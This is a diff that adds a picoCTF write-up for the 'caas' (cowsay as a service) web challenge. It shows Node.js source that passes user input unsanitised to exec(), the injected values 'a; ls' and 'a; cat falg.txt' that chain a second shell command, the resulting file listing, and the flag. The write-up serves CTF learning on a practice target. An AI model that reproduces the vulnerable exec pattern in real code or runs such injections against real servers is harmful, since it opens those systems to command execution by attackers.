@@ -408,6 +408,60 @@ If we set this value to the `login` cookie and perform a request to the `authent
 
 Flag: **picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_9d0864e2}**
 
+## caas ![p](https://img.shields.io/badge/Points-150-success) ![c](https://img.shields.io/badge/Web-purple)
+
+> Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)
+
+By accessing the website and submitting some random messages, I started thinking about injecting some malicious content to the request, because the message is just taken and printed back from a cow.  
+I tried to inject URL-encoded javascript, a Server Side Template Injection (by using a message like {{7\*7}}), but nothing seemed to work. I then tried to google some other possible attacks but still nothing.
+
+After some time I realized they gave us also a source code I completely ignored:
+```javascript
+const express = require('express');
+const app = express();
+const { exec } = require('child_process');
+
+app.use(express.static('public'));
+
+app.get('/cowsay/:message', (req, res) => {
+  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
+    if (error) return res.status(500).end();
+    res.type('txt').send(stdout).end();
+  });
+});
+
+app.listen(3000, () => {
+  console.log('listening');
+});
+```
+
+What we can conclude from there is that if we want to do something, the message must make the `exec()` function not to trigger an error, and to print back something useful instead. Also, the fact that `exec` is used may be a good thing for us.
+
+In a command line, multiple commands may be executed sequentially: if we write `cat hello.txt; cat world.txt` is like if we wrote `cat hello.txt` and `cat world.txt` one after the other. What if we can do the same here?
+
+If we try with `a; ls` we will get this:
+```
+ ___
+< a >
+ ---
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+Dockerfile
+falg.txt
+index.js
+node_modules
+package.json
+public
+yarn.lock
+```
+
+BOOM, we just need to send `a; cat falg.txt` and enjoy our points!
+
+Flag: **picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}**
+
 # Reverse Engineering
 ## ARMssembly 0 ![p](https://img.shields.io/badge/Points-40-success) ![c](https://img.shields.io/badge/Reverse-lightblue)
 
